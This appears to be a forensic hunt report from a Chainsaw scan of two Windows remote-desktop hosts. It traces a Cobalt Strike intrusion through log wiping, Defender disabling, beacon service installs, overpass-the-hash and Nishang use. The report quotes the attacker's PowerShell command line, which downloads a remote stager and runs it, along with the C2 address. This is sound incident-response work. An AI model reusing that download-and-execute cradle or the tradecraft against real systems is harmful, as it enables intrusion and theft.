# FINDEVIL — RD Hosts Chainsaw Hunt Report
**Job:** 8f7cba50  
**Evidence:** base-rd-01-cdrive.E01 / base-rd-02-cdrive.E01  
**Results:** /cases/FINDEVIL/analysis/8f7cba50/hunt_results.json  
**SHA-256:** d2ce7c8a717a095306475c7c7ea8781cb612cd096cd4fa76bf050a0e27068cfc  
**Generated:** 2026-06-13T16:35Z (UTC)

---

## Summary

| Metric | Value |
|--------|-------|
| Total hits | 23,306 |
| Rules triggered | 80 |
| Critical | 90 |
| High | 153 |
| Medium | 813 |
| Low | 311 |
| Info | 21,939 |

---

## Critical Detections

### 1. Security Audit Log Cleared — Both Hosts (2018-05-04)

| Field | Value |
|-------|-------|
| Timestamp | 2018-05-04T22:14:29Z |
| Event ID | 1102 |
| Computer | win10-test (pre-domain-join hostname for both rd-01 and rd-02) |
| Source | Security.evtx (both images) |

Both RD hosts had Security audit logs wiped at the same millisecond. The machine name "win10-test" indicates this occurred before the machines were domain-joined and renamed — likely during initial staging/imaging.

---

### 2. Cobalt Strike Service Installations — base-rd-01 (2018-08-28)

All installed as `LocalSystem`, demand-start, via `\\127.0.0.1\ADMIN$` — classic PSExec-style CS beacon deployment by `spsql`.

| Timestamp | Service Name | Binary |
|-----------|-------------|--------|
| 2018-08-28T00:57:32Z | 56e3de4 | 8f14386.exe |
| 2018-08-28T01:05:03Z | 9c3ae67 | e75f2c4.exe |
| 2018-08-28T01:09:03Z | 24f8f7e | 3795920.exe |
| 2018-08-30T16:42:44Z | fb9f33e | 35da1b7.exe |

Corroborated by EID 4697 in Security.evtx with `SubjectUserName: spsql` (SID S-1-5-21-3445421715-2530590580-3149308974-1193).

---

### 3. Cobalt Strike Service Installations — base-rd-02 (2018-08-31)

| Timestamp | Service Name | Binary / Command |
|-----------|-------------|-----------------|
| 2018-08-31T00:09:13Z | df0398a | \\127.0.0.1\ADMIN$\5b1b72b.exe |
| 2018-08-31T00:09:43Z | 8556ce1 | `%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -encodedcommand <base64>` |

The second service (8556ce1) is an encoded PS beacon. The base64 decodes to a GZip-decompressed Cobalt Strike stager running in memory.

---

### 4. Shellcode Injection via PowerShell — base-rd-01 (2018-08-30)

| Field | Value |
|-------|-------|
| Timestamp | 2018-08-30T13:51:28Z |
| Event ID | 4103 |
| User | shieldbase\spsql |
| Host Application | `powershell.exe -nop -w hidden -ec IEX ((new-object net.webclient).downloadstring('http://squirreldirectory.com/a'))` |

The payload is a reflective DLL loader (`func_get_proc_address` / `VirtualAlloc` / shellcode copy + execute pattern). The embedded shellcode contains the ASCII string `206.189.69.35` and a User-Agent string (`Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MATP; MATP)`) — consistent with confirmed C2 IP and CS beacon profile.

---

### 5. Additional Shellcode Injections — Both Hosts (2018-09-06–07) [NEW]

| Timestamp | Host | Notes |
|-----------|------|-------|
| 2018-09-06T17:13:36Z | base-rd-02 | Same PS reflective loader; shellcode embeds `\pipe\diagsvc-22` (CS SMB named-pipe beacon) |
| 2018-09-06T20:25:17Z | base-rd-01 | Same pattern; C2 IP `206.189.69.35` confirmed in shellcode |
| 2018-09-07T04:19:01Z | base-rd-02 | Same shellcode; Host Application = same squirreldirectory.com/a stager |

These sessions are **9 days after initial beacon deployment**, demonstrating sustained operator access well into September 2018.

---

### 6. spsql RDP Activity — Extensive

**Source: base-rd-01**  
All RDP logons are LogonType 10 (RemoteInteractive), `spsql`, SID S-1-5-21-...-1193.

| Date Range | Source IP | Notes |
|-----------|-----------|-------|
| 2018-07-11 – 2018-08-02 | 192.168.30.10 | `tdungan` account — initial access phase |
| 2018-07-18 | 192.168.30.10 | First confirmed `tdungan` EID 4624 |
| 2018-08-28T21:39Z | 172.16.6.14 (base-rd-04) | `spsql` — post-beacon pivot |
| 2018-08-31 (multiple) | 172.16.6.14 | `spsql` continued control of rd-01 |
| 2018-09-05 (multiple) | 172.16.6.14 | `spsql` — 8+ sessions 11:51–18:45Z |

**Source: base-rd-02**  
| Date Range | Source IP | Notes |
|-----------|-----------|-------|
| 2018-08-31T00:17Z | 172.16.6.11 (base-rd-01) | `spsql` — immediate after beacon deployment |
| 2018-08-31T00:41Z | 172.16.6.11 | Second `spsql` session to rd-02 from rd-01 |

---

## High Detections

### Windows Defender Disablement — Repeated Pattern on rd-02

Defender was disabled repeatedly across an extended campaign. Observed events on rd-02 (5010/5012):

| Date | Type |
|------|------|
| 2018-05-07T19:24:23Z | Threat detection + malware scanning disabled (pre-domain name, "win10-test") |
| 2018-05-09T14:47:57Z | Virus scanning + threat detection disabled (base-rd-02.shieldbase.lan) |
| 2018-05-09T14:49:50Z | Re-disabled (2 seconds after rd-01 disable at 14:49:52) |
| 2018-05-30T02:40:53Z | Disabled again (daily reboot re-enabled it) |
| 2018-05-31T02:30:46Z | Disabled again |
| 2018-06-01T02:42:01Z | Disabled again |

The recurring ~2am disablement on rd-02 from late May onward suggests a scheduled task or startup script.  
rd-01 shows the same scripted pattern on 2018-05-09 (4-second offset from rd-02).

---

### Overpass-the-Hash — base-rd-01 (2018-08-30) [NEW]

| Field | Value |
|-------|-------|
| Timestamp | 2018-08-30T22:45:25Z |
| Rule | Successful Overpass the Hash Attempt |
| Event ID | 4624 |
| Host | base-rd-01.shieldbase.lan |

An Overpass-the-Hash logon was detected 8 hours after the shellcode injection on rd-01 (13:51Z) and ~31 minutes before the lateral move to all workstations began (2018-08-30T22:33–2018-08-31T01:31Z). This confirms `spsql` obtained a Kerberos TGT via PTH and used it to authenticate laterally.

---

### Nishang PowerShell Commandlets — base-rd-01 and rd-02 [NEW]

"Malicious Nishang PowerShell Commandlets" fired multiple times on both hosts:

| Timestamp | Host |
|-----------|------|
| 2018-08-30T18:31:09Z | base-rd-01 |
| 2018-08-30T18:31:18Z | base-rd-01 |
| 2018-08-30T21:40:21Z | base-rd-01 |
| 2018-08-30T21:40:43Z | base-rd-01 |
| 2018-08-31T00:43:21Z | base-rd-02 |
| 2018-08-31T00:44:08Z | base-rd-02 |
| 2018-08-31T00:44:25Z | base-rd-02 |

These align with the lateral movement window. Nishang scripts (likely Invoke-PowerShellTcp or similar) were used alongside CS beacons for interactive shell access.

---

### CS Service Installations — Security Log Corroboration

EID 4697 (service installed, Security.evtx) confirms `spsql` as the installing principal for all CS beacons on both hosts. SubjectUserSid matches S-1-5-21-3445421715-2530590580-3149308974-1193 in every case.

---

### PowerShell Shellcode — Continued Activity (Sep 6–7)

High-severity `PowerShell ShellCode` and `Suspicious PowerShell Invocations - Specific` continued firing on both hosts in the September 6–7 window. The rd-02 Sep 7 event (04:24:57Z, EID 4104) contains the full reflective loader with a `\pipe\diagsvc-22` named-pipe string, indicating an SMB Cobalt Strike beacon was also active on rd-02.

---

## Attack Timeline (Consolidated)

```
2018-05-04T22:14:29Z  Security + System logs wiped on both RD hosts (pre-domain, "win10-test")
2018-05-07T19:24:23Z  Defender disabled on rd-02 (+2s later on rd-01) — initial setup
2018-05-09T14:47:57Z  Defender fully disabled on rd-02 (+4s on rd-01) — scripted, simultaneous
2018-05-09T14:49:50Z  Defender re-disabled on rd-02 (persistence)
2018-05-30 – 06-01    Defender auto-disabled ~02:40am daily on rd-02 (scheduled task suspected)
2018-07-11 – 08-02    tdungan RDP to rd-01 from 192.168.30.10 (initial access / reconnaissance)
2018-08-28T00:57:32Z  3x CS beacons deployed on rd-01 by spsql (56e3de4, 9c3ae67, 24f8f7e)
2018-08-28T21:39:08Z  spsql RDP to rd-01 from 172.16.6.14 (base-rd-04)
2018-08-28T22:10:15Z  spsql disconnects — WMIC sweep initiated (rd-01 → file, rd-02–06, base-av)
2018-08-30T13:51:28Z  Shellcode injection on rd-01 — IEX squirreldirectory.com/a → 206.189.69.35
2018-08-30T16:42:44Z  4th CS beacon (fb9f33e / 35da1b7.exe) on rd-01
2018-08-30T18:31:09Z  Nishang PS commandlets on rd-01 (interactive shell)
2018-08-30T21:40:21Z  Nishang PS commandlets on rd-01 (second wave)
2018-08-30T22:45:25Z  Overpass-the-Hash on rd-01 — credential material harvested [NEW]
2018-08-30T22:33 – 2018-08-31T01:31Z  WMIC/PS lateral movement to all 6 workstations
2018-08-31T00:06:57Z  Last PS lateral movement prep on rd-01
2018-08-31T00:08:48Z  Shellcode on rd-02 (CS stager arrives)
2018-08-31T00:09:13Z  CS beacon df0398a / 5b1b72b.exe deployed on rd-02 by spsql
2018-08-31T00:09:43Z  CS PowerShell beacon (8556ce1) deployed on rd-02
2018-08-31T00:17:04Z  spsql RDP to rd-02 from rd-01 (172.16.6.11)
2018-08-31T00:43–44Z  Nishang PS commandlets on rd-02 (interactive shell)
2018-09-05T11:51 – 18:45Z  spsql multiple RDP sessions to rd-01 from 172.16.6.14 (8+ sessions)
2018-09-06T17:13:36Z  Shellcode on rd-02 (SMB beacon — \pipe\diagsvc-22) [NEW]
2018-09-06T20:25:17Z  Shellcode on rd-01 (C2: 206.189.69.35) [NEW]
2018-09-07T04:19:01Z  Shellcode on rd-02 (same SMB pipe stager) [NEW]
2018-09-07T04:24:57Z  PS shellcode on rd-02 — squirreldirectory.com/a stager [NEW]
```

---

## New Findings vs. Prior Hunt (5e1a9fc9)

| Finding | Status |
|---------|--------|
| Overpass-the-Hash on rd-01 at 2018-08-30T22:45Z | **NEW** |
| Nishang PS commandlets on both hosts | **NEW** |
| CS SMB named-pipe beacon (`\pipe\diagsvc-22`) on rd-02 | **NEW** |
| Continued operator activity Sep 6–7 on both hosts | **NEW** |
| Recurring daily Defender disable on rd-02 (May 30 – Jun 1) | **NEW** |
| spsql 8+ RDP sessions to rd-01 on Sep 5 alone | **NEW (detail)** |

---

## Evidence Integrity

| Item | Value |
|------|-------|
| Job ID | 8f7cba50 |
| hunt_results.json SHA-256 | d2ce7c8a717a095306475c7c7ea8781cb612cd096cd4fa76bf050a0e27068cfc |
| Raw output SHA-256 | 550d78832991931b19060c5614cf9c11e2d620eaa5424731b32a5c795138ae39 |
| Chainsaw version | 2.16.0 |
| Evidence paths | /cases/FINDEVIL/base-rd-01-cdrive.E01, /cases/FINDEVIL/base-rd-02-cdrive.E01 |
| Full report | /cases/FINDEVIL/reports/hunt_report.txt |
